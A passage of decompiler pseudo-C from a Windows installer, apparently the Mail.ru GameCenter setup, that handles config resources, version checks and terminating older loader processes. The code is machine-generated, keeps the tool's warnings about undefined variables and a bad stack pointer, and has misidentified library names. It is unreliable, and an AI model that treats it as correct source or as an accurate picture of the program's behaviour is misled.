  unsigned int v2[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v3; // [esp-4h] [ebp-Ch]
  int v4; // [esp+0h] [ebp-8h] BYREF
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v4 = 0;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_45A9E9;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !dword_46F6F0 )
  {
    sub_44D9A0((int)dword_46F6F8, (int)&v4);
    dword_46F6F0 = sub_43EF70((int)&cls_IniUtil_TUnicodeIniFile, 1, v4, a1, 1, 0, 2, 1);
  }
  v5 = dword_46F6F0;
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_45A9F0;
  sub_406C44(&v4);
  return v5;
}
// 43E520: using guessed type int (__stdcall *cls_IniUtil_TUnicodeIniFile)(int);
// 46F6F0: using guessed type int dword_46F6F0;

//----- (0045AA00) --------------------------------------------------------
volatile __int32 *__fastcall sub_45AA00(volatile __int32 *a1)
{
  return sub_406FE8(a1, (int)L"gamecenter4");
}
// 45AA24: using guessed type wchar_t aGamecenter4[12];

//----- (0045AA40) --------------------------------------------------------
char __fastcall sub_45AA40(int a1, _DWORD *a2, _DWORD *a3)
{
  signed int v4; // [esp+0h] [ebp-14h]

  v4 = sub_407B7C((int)sub_45AAB4, a1, 1);
  if ( v4 <= 1 )
    return 0;
  sub_407AD8(a1, 1, v4 - 1, a2);
  sub_407AD8(a1, v4 + 1, 0x7FFFFFFF, a3);
  return 1;
}
// 45AAB4: using guessed type int sub_45AAB4();

//----- (0045AAC0) --------------------------------------------------------
int __usercall sub_45AAC0@<eax>(int a1@<edi>)
{
  int v1; // edx
  int v2; // ecx
  int v3; // eax
  int v4; // eax
  _DWORD v6[3]; // [esp-18h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v8; // [esp-8h] [ebp-1Ch]
  int *v9; // [esp-4h] [ebp-18h]
  int v10; // [esp+0h] [ebp-14h] BYREF
  unsigned int v11; // [esp+4h] [ebp-10h] BYREF
  UINT System__WideString; // [esp+8h] [ebp-Ch] BYREF
  _DWORD *v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  System__WideString = 0;
  v11 = 0;
  v10 = 0;
  v9 = &savedregs;
  v8 = &loc_45ABD6;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !dword_467E8C )
  {
    dword_467E8C = sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
    if ( FindResourceW(hModule, L"extcfg", (LPCWSTR)0xA) )
    {
      LOBYTE(v1) = 1;
      v13 = (_DWORD *)Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
                        &cls_CrossPlatform_TResourceStream,
                        v1,
                        hModule,
                        L"extcfg",
                        10);
      v6[2] = &savedregs;
      v6[1] = &loc_45ABA1;
      v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v6);
      v3 = (*(int (__fastcall **)(_DWORD *, _DWORD, int, void *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, void *, _DWORD))*v13)(
             v13,
             *v13,
             v2,
             v8,
             ExceptionList,
             &savedregs,
             &loc_45ABA1,
             v6[0]);
      sub_4075BC(&System__WideString, v3, 0);
      v10 = (*(int (__fastcall **)(_DWORD *))*v13)(v13);
      v4 = sub_4071C8(&System__WideString);
      sub_4275A0((int)v13, v4, v10, a1);
      sub_40B3BC(System__WideString);
      System::__linkproc__ LStrFromWStr(&v11, v10);
      sub_4289D0((_DWORD *)dword_467E8C, v11);
      __writefsdword(0, v11);
      v13 = &loc_45ABA8;
      sub_405598(&loc_45ABA8);
    }
  }
  v14 = dword_467E8C;
  __writefsdword(0, (unsigned int)ExceptionList);
  v9 = (int *)&loc_45ABDD;
  System::__linkproc__ WStrClr(&v10, ExceptionList);
  sub_406C44(&v11);
  sub_406C68(&System__WideString);
  return v14;
}
// 45AB24: variable 'v1' is possibly undefined
// 45AB3F: variable 'v2' is possibly undefined
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 407860: using guessed type int __fastcall System::__linkproc__ LStrFromWStr(_DWORD, _DWORD);
// 42286C: using guessed type int (*cls_CrossPlatform_TResourceStream)();
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 427C00: using guessed type _DWORD __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, HMODULE hModule, _DWORD, _DWORD);
// 45AC00: using guessed type wchar_t aExtcfg_0[7];
// 467E8C: using guessed type int dword_467E8C;

//----- (0045AC10) --------------------------------------------------------
bool __fastcall sub_45AC10(const WCHAR *a1)
{
  char v1; // zf
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v4; // [esp-8h] [ebp-18h]
  int *v5; // [esp-4h] [ebp-14h]
  CHAR *v6; // [esp+0h] [ebp-10h] BYREF
  int v7; // [esp+4h] [ebp-Ch] BYREF
  bool v8; // [esp+Bh] [ebp-5h]
  const WCHAR *v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v7 = 0;
  v6 = 0;
  v9 = a1;
  v5 = &savedregs;
  v4 = &loc_45AC77;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_407634(&v6, a1, 0, (unsigned __int16)ExceptionList);
  sub_407840(&v7, (int)v6, (int)v4);
  sub_407AA0((int)v9, v7);
  v8 = !v1;
  __writefsdword(0, (unsigned int)v4);
  v6 = (CHAR *)&loc_45AC7E;
  sub_406C68(&v6);
  sub_406C44(&v7);
  return v8;
}
// 45AC55: variable 'v1' is possibly undefined
// 45AC10: using guessed type int var_C;

//----- (0045AC90) --------------------------------------------------------
int __usercall sub_45AC90@<eax>(_DWORD **a1@<edi>, int a2@<esi>)
{
  int (__fastcall ***v2)(_DWORD, int); // eax
  int v3; // eax
  int v4; // eax
  char v5; // zf
  int (__fastcall ***v6)(_DWORD, int); // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // eax
  void *v15; // [esp-28h] [ebp-60h]
  void *v16; // [esp-28h] [ebp-60h]
  unsigned int v17; // [esp-24h] [ebp-5Ch]
  unsigned int v18[2]; // [esp-18h] [ebp-50h] BYREF
  int *v19; // [esp-10h] [ebp-48h]
  _DWORD v20[6]; // [esp-Ch] [ebp-44h] BYREF
  __int32 v21; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned int v22; // [esp+10h] [ebp-28h] BYREF
  int v23; // [esp+14h] [ebp-24h] BYREF
  int v24; // [esp+18h] [ebp-20h] BYREF
  __int32 v25; // [esp+1Ch] [ebp-1Ch] BYREF
  int v26; // [esp+24h] [ebp-14h]
  int v27; // [esp+28h] [ebp-10h] BYREF
  DWORD v28; // [esp+2Ch] [ebp-Ch] BYREF
  int System__AnsiString; // [esp+30h] [ebp-8h]
  Idthreadcomponent::TIdThreadComponent *v30; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v20[2] = &savedregs;
  v20[1] = &loc_45AEEB;
  v20[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v20);
  v19 = &savedregs;
  v18[1] = (unsigned int)&loc_45AE94;
  v18[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v18);
  sub_433BE0(*off_467F18, (int)L"CopyExtCfg", (int)L"Installer:");
  sub_406C44(&v28);
  sub_406C44(&v27);
  v30 = (Idthreadcomponent::TIdThreadComponent *)sub_45AAC0((int)a1);
  sub_45AFD0(off_467E58, &v25, (int)a1);
  if ( v25 )
  {
    v2 = (int (__fastcall ***)(_DWORD, int))sub_45A980(a1);
    if ( !(unsigned __int8)sub_4410A0(v2, off_467E70) )
    {
      sub_426040(0, &v23);
      sub_415150(53606, (int *)&v22);
      v17 = v22;
      sub_4079F0(&v24, 3);
      v15 = (void *)v24;
      v3 = sub_45A980(a1);
      sub_441320(v3, off_467E70, off_467E60, (int)a1, v15);
    }
  }
  v4 = sub_45A980(a1);
  sub_43F0C0(v4, cchLength, off_467E58, a2);
  if ( *((_DWORD *)v30 + 2) - 1 >= 0 )
  {
    v26 = *((_DWORD *)v30 + 2);
    System__AnsiString = 0;
    do
    {
      sub_428E60(v30, System__AnsiString, &v21);
      if ( sub_45AA40(v21, &v28, &v27) )
      {
        sub_407AA0((int)off_467E6C[0], v28);
        if ( !v5
          || (v6 = (int (__fastcall ***)(_DWORD, int))sub_45A980(a1), !(unsigned __int8)sub_4410A0(v6, cchLength)) )
        {
          v7 = sub_45A980(a1);
          if ( (unsigned __int8)sub_43F2B0(v7) != 2 && sub_45AC10((const WCHAR *)v27) )
          {
            v8 = sub_45A980(a1);
            sub_440DE0(v8, 2);
          }
          v16 = (void *)v27;
          v9 = sub_45A980(a1);
          sub_441320(v9, cchLength, v28, (int)a1, v16);
        }
      }
      ++System__AnsiString;
      --v26;
    }
    while ( v26 );
  }
  v10 = sub_45A980(a1);
  if ( !(unsigned __int8)sub_440D40(v10, cchLength, v11) )
  {
    v30 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
    v12 = sub_45A980(a1);
    sub_441110(v12, (_DWORD *)cchLength, v30, (int)a1, a2);
    sub_405598(v30);
  }
  v13 = sub_45A980(a1);
  if ( (unsigned __int8)sub_43EE40(v13, cchLength) )
    sub_433BE0(*off_467F18, (int)L"ExtCfg section moved to top", (int)L"Installer:");
  __writefsdword(0, v17);
  __writefsdword(0, v18[0]);
  v19 = (int *)&loc_45AEF2;
  sub_406CA4((int)&v21, 5);
  return sub_406CA4((int)&v27, 2);
}
// 45ADC0: variable 'v5' is possibly undefined
// 45AE2D: variable 'v11' is possibly undefined
// 45AE8F: variable 'v17' is possibly undefined
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 45AF08: using guessed type wchar_t aInstaller[11];
// 45AF2C: using guessed type wchar_t aCopyextcfg[11];
// 45AF60: using guessed type wchar_t aExtcfgSectionM[28];
// 467E6C: using guessed type wchar_t *off_467E6C[4];
// 467F18: using guessed type int *off_467F18;

//----- (0045AFD0) --------------------------------------------------------
int __usercall sub_45AFD0@<eax>(int a1@<eax>, volatile __int32 *a2@<edx>, int a3@<edi>)
{
  char v3; // zf
  unsigned int v5[3]; // [esp-18h] [ebp-48h] BYREF
  unsigned int v6[2]; // [esp-Ch] [ebp-3Ch] BYREF
  int *v7; // [esp-4h] [ebp-34h]
  __int32 v8; // [esp+Ch] [ebp-24h] BYREF
  int v9; // [esp+14h] [ebp-1Ch]
  int v10; // [esp+18h] [ebp-18h] BYREF
  int v11; // [esp+1Ch] [ebp-14h] BYREF
  Idthreadcomponent::TIdThreadComponent *v12; // [esp+20h] [ebp-10h]
  int System__AnsiString; // [esp+24h] [ebp-Ch]
  volatile __int32 *v14; // [esp+28h] [ebp-8h]
  int v15; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v8 = 0;
  v11 = 0;
  v10 = 0;
  v14 = a2;
  v15 = a1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_45B0E2;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_406C44(a2);
  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_45B090;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v12 = (Idthreadcomponent::TIdThreadComponent *)sub_45AAC0(a3);
  sub_406C44(&v11);
  sub_406C44(&v10);
  if ( *((_DWORD *)v12 + 2) - 1 < 0 )
  {
LABEL_7:
    __writefsdword(0, v5[0]);
  }
  else
  {
    v9 = *((_DWORD *)v12 + 2);
    System__AnsiString = 0;
    while ( 1 )
    {
      sub_428E60(v12, System__AnsiString, &v8);
      if ( sub_45AA40(v8, &v11, &v10) )
      {
        sub_407AA0(v11, v15);
        if ( v3 )
          break;
      }
      ++System__AnsiString;
      if ( !--v9 )
        goto LABEL_7;
    }
    sub_406FE8(v14, v10);
    __writefsdword(0, v5[0]);
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_45B0E9;
  sub_406C44(&v8);
  return sub_406CA4((int)&v10, 2);
}
// 45B067: variable 'v3' is possibly undefined

//----- (0045B140) --------------------------------------------------------
volatile __int32 *__fastcall sub_45B140(volatile __int32 *a1)
{
  return sub_407968(a1, L"GameCenter.AppMainWindow", dword_46F6EC);
}
// 45B16C: using guessed type wchar_t aGamecenterAppm[25];

//----- (0045B1A0) --------------------------------------------------------
bool sub_45B1A0()
{
  const WCHAR *v0; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v3; // [esp-4h] [ebp-Ch]
  __int32 v4; // [esp+0h] [ebp-8h] BYREF
  bool v5; // [esp+7h] [ebp-1h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v4 = 0;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_45B1ED;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_45B140(&v4);
  v0 = (const WCHAR *)sub_407790(v4);
  v5 = FindWindowW(v0, 0) != 0;
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_45B1F4;
  sub_406C44(&v4);
  return v5;
}
// 45B1A0: using guessed type __int32 var_8;

//----- (0045B200) --------------------------------------------------------
signed int sub_45B200()
{
  unsigned int v1; // [esp-1Ch] [ebp-38h]
  _DWORD v2[3]; // [esp-Ch] [ebp-28h] BYREF
  unsigned int v3; // [esp+0h] [ebp-1Ch] BYREF
  int v4; // [esp+4h] [ebp-18h] BYREF
  int v5; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+10h] [ebp-Ch] BYREF
  __int16 v8; // [esp+14h] [ebp-8h] BYREF
  __int16 v9; // [esp+16h] [ebp-6h] BYREF
  signed int v10; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v7 = 0;
  v6 = 0;
  v5 = 0;
  v4 = 0;
  v3 = 0;
  v2[2] = &savedregs;
  v2[1] = &loc_45B2B3;
  v2[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_44D910((int)dword_46F6F8, (int)&v6);
  if ( sub_44AE00(v6, &v9, &v8, (_WORD *)&v7 + 1, &v7) )
    v10 = HIWORD(v7);
  else
    v10 = 0;
  sub_415150(v10, &v4);
  sub_415150(1569, (int *)&v3);
  v1 = v3;
  sub_4079F0(&v5, 4);
  sub_433BE0(*off_467F18, v5, (int)L"Installer:");
  __writefsdword(0, v1);
  sub_406CA4((int)&v3, 4);
  return v10;
}
// 45B33C: using guessed type wchar_t aInstaller_0[11];
// 467F18: using guessed type int *off_467F18;

//----- (0045B360) --------------------------------------------------------
signed int sub_45B360()
{
  unsigned int v1; // [esp-1Ch] [ebp-38h]
  _DWORD v2[3]; // [esp-Ch] [ebp-28h] BYREF
  unsigned int v3; // [esp+0h] [ebp-1Ch] BYREF
  int v4; // [esp+4h] [ebp-18h] BYREF
  int v5; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+10h] [ebp-Ch] BYREF
  __int16 v8; // [esp+14h] [ebp-8h] BYREF
  __int16 v9; // [esp+16h] [ebp-6h] BYREF
  signed int v10; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v7 = 0;
  v6 = 0;
  v5 = 0;
  v4 = 0;
  v3 = 0;
  v2[2] = &savedregs;
  v2[1] = &loc_45B413;
  v2[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_44D910((int)dword_46F6F8, (int)&v6);
  if ( sub_44AE00(v6, &v9, &v8, (_WORD *)&v7 + 1, &v7) )
    v10 = (unsigned __int16)v7;
  else
    v10 = 0;
  sub_415150(v10, &v4);
  sub_415150(53606, (int *)&v3);
  v1 = v3;
  sub_4079F0(&v5, 4);
  sub_433BE0(*off_467F18, v5, (int)L"Installer:");
  __writefsdword(0, v1);
  sub_406CA4((int)&v3, 4);
  return v10;
}
// 45B4A4: using guessed type wchar_t aInstaller_1[11];
// 467F18: using guessed type int *off_467F18;

//----- (0045B4C0) --------------------------------------------------------
unsigned __int8 __usercall sub_45B4C0@<al>(_DWORD **a1@<edi>, int a2@<esi>, long double a3@<st0>)
{
  bool v3; // al
  const WCHAR *v4; // eax
  bool v5; // al
  int v6; // eax
  unsigned int v8; // [esp-1Ch] [ebp-74h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-70h] BYREF
  _WORD *v10; // [esp-14h] [ebp-6Ch]
  const wchar_t *v11; // [esp-10h] [ebp-68h]
  _DWORD v12[3]; // [esp-Ch] [ebp-64h] BYREF
  unsigned int v13; // [esp+0h] [ebp-58h] BYREF
  int v14; // [esp+4h] [ebp-54h] BYREF
  __int32 v15; // [esp+8h] [ebp-50h] BYREF
  int v16; // [esp+Ch] [ebp-4Ch] BYREF
  void *v17; // [esp+10h] [ebp-48h] BYREF
  int v18; // [esp+14h] [ebp-44h] BYREF
  int v19; // [esp+18h] [ebp-40h] BYREF
  _WORD *v20; // [esp+1Ch] [ebp-3Ch] BYREF
  __int32 v21; // [esp+20h] [ebp-38h] BYREF
  __int32 v22; // [esp+24h] [ebp-34h] BYREF
  _WORD *v23; // [esp+28h] [ebp-30h] BYREF
  __int32 v24; // [esp+2Ch] [ebp-2Ch] BYREF
  __int32 v25; // [esp+30h] [ebp-28h] BYREF
  int v26; // [esp+34h] [ebp-24h]
  int v27; // [esp+38h] [ebp-20h] BYREF
  int v28; // [esp+3Ch] [ebp-1Ch] BYREF
  _WORD *v29; // [esp+40h] [ebp-18h] BYREF
  int v30; // [esp+44h] [ebp-14h]
  _DWORD *v31; // [esp+48h] [ebp-10h]
  __int32 v32; // [esp+4Ch] [ebp-Ch] BYREF
  unsigned __int8 v34; // [esp+57h] [ebp-1h]
  int savedregs; // [esp+58h] [ebp+0h] BYREF

  v12[2] = &savedregs;
  v12[1] = &loc_45B880;
  v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  if ( byte_46F6F4 )
  {
    sub_45AFD0((int)L"DontReinstall", &v25, (int)a1);
    if ( v25 )
    {
      v34 = 1;
    }
    else
    {
      v3 = sub_45B200() > 1569 || sub_45B200() == 1569 && sub_45B360() >= 53606;
      v34 = v3;
      if ( v3 )
      {
        sub_45AFD0((int)off_467E68[0], &v24, (int)a1);
        if ( v24 )
        {
          sub_45AA00((volatile __int32 *)&v23);
          v10 = v23;
          sub_45A980(a1);
          if ( (int)Xmldoc::TXMLNodeList::Delete(0) <= 1569 )
            v34 = 0;
        }
        sub_45AFD0(off_467E58, &v22, (int)a1);
        if ( v22 || (sub_45AFD0((int)off_467E5C[0], &v21, (int)a1), v21) )
        {
          sub_45AA00((volatile __int32 *)&v20);
          v10 = v20;
          sub_45A980(a1);
          if ( Xmldoc::TXMLNodeList::Delete(0) - 4 <= 1569 )
            v34 = 0;
        }
      }
      if ( v34 )
      {
        if ( !byte_467E88 )
        {
          sub_45B140(&v32);
          v4 = (const WCHAR *)sub_407790(v32);
          if ( FindWindowW(v4, 0) )
          {
            sub_425250((int)dword_46F6F8, &v19);
            v31 = (_DWORD *)sub_457990((int)&cls_DownloaderInterprocess_TSelfServiceClient, 1, v19, (int)a1, a2);
            v11 = (const wchar_t *)&savedregs;
            v10 = &loc_45B689;
            ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
            __writefsdword(0, (unsigned int)&ExceptionList);
            sub_457C70((int)v31, 5000i64);
            v5 = sub_457AF0((int)v31, dword_46F6FC, (int)a1) && sub_457BD0((int)v31, 5000i64);
            byte_467E7D = v5;
            __writefsdword(0, (unsigned int)ExceptionList);
            v11 = (const wchar_t *)&loc_45B694;
            sub_405598(v31);
          }
        }
      }
    }
  }
  else
  {
    v34 = 0;
  }
  sub_415150(v34, (int *)&v17);
  sub_407968(&v18, L"AlreadyInstalledBase=", v17);
  sub_433BE0(*off_467F18, v18, (int)L"Installer:");
  if ( !byte_467E7D || byte_467E88 )
  {
    sub_457320((int)L"MyComLoader.TMainForm", 0, 0, (int)a1, a2, a3);
    sub_457320((int)L"MailRuLoader.TMainForm", 0, 0, (int)a1, a2, a3);
    sub_457320((int)L"MailRuDownloader.TMainForm", 0, 0, (int)a1, a2, a3);
    sub_425250((int)dword_46F6F8, &v16);
    v11 = (const wchar_t *)v16;
    sub_45B140(&v15);
    sub_457320(v15, 0, (DWORD)v11, (int)a1, a2, a3);
    sub_44D910((int)dword_46F6F8, (int)&v27);
    sub_44C140(0, 1, &v28);
    v6 = sub_40867C(v28);
    if ( v6 >= 0 )
    {
      v26 = v6 + 1;
      v30 = 0;
      do
      {
        sub_407030((volatile __int32 *)&v29, *(_DWORD *)(v28 + 20 * v30 + 16));
        if ( v29 && *v29 == 34 )
          sub_407B20((volatile __int32 *)&v29, 1, 1);
        if ( !sub_426AB0(*(_DWORD *)(v28 + 20 * v30 + 8), v27) || (unsigned __int8)sub_424040(v27, (int)v29, 0) )
        {
          if ( sub_44BB40(*(_DWORD *)(v28 + 20 * v30), (int)a1, a2, a3) )
            sub_407030((volatile __int32 *)&v29, (__int32)L"terminated");
          else
            sub_407030((volatile __int32 *)&v29, (__int32)L"termination failed");
          v11 = L"Process ";
          v10 = v29;
          ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)L". PID: ";
          unknown_libname_74(*(_DWORD *)(v28 + 20 * v30), &v13);
          v8 = v13;
          sub_4079F0(&v14, 4);
          sub_433BE0(*off_467F18, v14, (int)L"Installer:");
        }
        ++v30;
        --v26;
      }
      while ( v26 );
    }
  }
  __writefsdword(0, v8);
  v10 = &loc_45B887;
  sub_406CA4((int)&v13, 13);
  sub_406C44(&v27);
  sub_408B34(&v28, (int)&byte_44ADC4);
  sub_406C44(&v29);
  sub_406C44(&v32);
  return v34;
}
// 45B844: variable 'v8' is possibly undefined
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 43FE70: using guessed type _DWORD __stdcall Xmldoc::TXMLNodeList::Delete(_DWORD);
// 44ADC4: using guessed type char byte_44ADC4;
// 457140: using guessed type __int16 cls_DownloaderInterprocess_TSelfServiceClient;
// 45B89C: using guessed type wchar_t aDontreinstall[14];
// 45B8D8: using guessed type wchar_t aAlreadyinstall[22];
// 45B910: using guessed type wchar_t aInstaller_2[11];
// 45B934: using guessed type wchar_t aMycomloaderTma[22];
// 45B96C: using guessed type wchar_t aMailruloaderTm[23];
// 45B9A8: using guessed type wchar_t aMailrudownload[27];
// 45B9EC: using guessed type wchar_t aTerminated[11];
// 45BA10: using guessed type wchar_t aTerminationFai[19];
// 45BA44: using guessed type wchar_t aProcess[9];
// 45BA64: using guessed type wchar_t aPid[8];
// 467E5C: using guessed type wchar_t *off_467E5C[8];
// 467E68: using guessed type wchar_t *off_467E68[5];
// 467E7D: using guessed type char byte_467E7D;
// 467E88: using guessed type char byte_467E88;
// 467F18: using guessed type int *off_467F18;
// 46F6F4: using guessed type char byte_46F6F4;
// 46F6FC: using guessed type int dword_46F6FC;

//----- (0045BA80) --------------------------------------------------------
char __usercall sub_45BA80@<al>(int a1@<edi>)
{
  char v1; // zf
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  DWORD cchLength; // [esp+0h] [ebp-8h] BYREF
  char v6; // [esp+7h] [ebp-1h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  cchLength = 0;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_45BB0E;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v6 = byte_467E7C != 0;
  sub_45AFD0((int)off_467E78, (volatile __int32 *)&cchLength, a1);
  if ( byte_467E7C && (sub_407AA0(cchLength, (int)*off_468040), v1) )
  {
    v6 = sub_44B4B0(v6, 0);
    if ( !v6 )
      v6 = 1;
  }
  else
  {
    sub_451900(cchLength, &v6);
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_45BB15;
  sub_406C44(&cchLength);
  return v6;
}
// 45BAD2: variable 'v1' is possibly undefined
// 467E78: using guessed type wchar_t *off_467E78;
// 467E7C: using guessed type char byte_467E7C;
// 468040: using guessed type wchar_t **off_468040;

//----- (0045BB20) --------------------------------------------------------
int __usercall sub_45BB20@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  char v3; // zf
  unsigned int v5[3]; // [esp-24h] [ebp-44h] BYREF
  unsigned int v6[2]; // [esp-18h] [ebp-38h] BYREF
  int *v7; // [esp-10h] [ebp-30h]
  int v8; // [esp-Ch] [ebp-2Ch]
  int v9; // [esp-8h] [ebp-28h]
  int v10; // [esp-4h] [ebp-24h]
  int v11; // [esp+0h] [ebp-20h] BYREF
  int v12; // [esp+4h] [ebp-1Ch] BYREF
  unsigned __int16 *v13; // [esp+8h] [ebp-18h] BYREF
  __int32 v14; // [esp+Ch] [ebp-14h] BYREF
  int v15; // [esp+10h] [ebp-10h] BYREF
  _WORD *v16; // [esp+14h] [ebp-Ch] BYREF
  int System__AnsiString; // [esp+18h] [ebp-8h]
  Idthreadcomponent::TIdThreadComponent *v18; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = a1;
  v9 = a3;
  v8 = a2;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_45BC76;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_45BC51;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v18 = (Idthreadcomponent::TIdThreadComponent *)sub_45AAC0(a2);
  sub_406C44(&v16);
  sub_406C44(&v15);
  if ( *((_DWORD *)v18 + 2) - 1 >= 0 )
  {
    System__AnsiString = *((_DWORD *)v18 + 2) - 1;
    do
    {
      sub_428E60(v18, System__AnsiString, &v14);
      if ( sub_45AA40(v14, &v16, &v15) )
      {
        sub_424550(v16, &v13);
        sub_407030((volatile __int32 *)&v16, (__int32)v13);
        sub_407AA0((int)v16, (int)L"sgl");
        if ( v3 && v15 )
          sub_406FE8((volatile __int32 *)&dword_46F6EC, v15);
        sub_407AA0((int)v16, (int)L"n_launcher_rel");
        if ( v3 )
          sub_406FE8((volatile __int32 *)&dword_46F6E4, v15);
        sub_407AA0((int)v16, (int)L"n_root_rel");
        if ( v3 )
        {
          sub_406FE8((volatile __int32 *)&dword_46F6E8, v15);
          sub_426040(0, &v11);
          sub_4253F0(v11, &v12);
          sub_407910(&v12, L"last.xml");
          byte_467E88 = sub_426B00(v12);
        }
      }
      --System__AnsiString;
    }
    while ( System__AnsiString != -1 );
  }
  __writefsdword(0, v5[0]);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_45BC7D;
  return sub_406CA4((int)&v11, 6);
}
// 45BB20: could not find valid save-restore pair for ebx
// 45BB20: could not find valid save-restore pair for edi
// 45BB20: could not find valid save-restore pair for esi
// 45BBBE: variable 'v3' is possibly undefined
// 45BC90: using guessed type wchar_t aSgl[4];
// 45BCA4: using guessed type wchar_t aNLauncherRel[15];
// 45BCD0: using guessed type wchar_t aNRootRel[11];
// 45BCF4: using guessed type wchar_t aLastXml[9];
// 467E88: using guessed type char byte_467E88;

//----- (0045BD10) --------------------------------------------------------
char sub_45BD10()
{
  if ( byte_467E7C )
    return 35;
  else
    return 27;
}
// 467E7C: using guessed type char byte_467E7C;

//----- (0045BD30) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_45BD30@<eax>(__int32 a1@<ecx>, int a2@<edi>)
{
  int v2; // edx
  int v3; // ecx
  __int64 v4; // rax
  char v5; // zf
  _DWORD *v6; // eax
  char v7; // al
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-3Ch] BYREF
  volatile __int32 *v10; // [esp-14h] [ebp-38h]
  volatile __int32 *v11; // [esp-10h] [ebp-34h]
  _DWORD v12[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v13; // [esp-4h] [ebp-28h]
  __int32 v14; // [esp+0h] [ebp-24h] BYREF
  void *v15; // [esp+4h] [ebp-20h] BYREF
  int v16; // [esp+8h] [ebp-1Ch] BYREF
  int v17; // [esp+Ch] [ebp-18h] BYREF
  int v18; // [esp+10h] [ebp-14h] BYREF
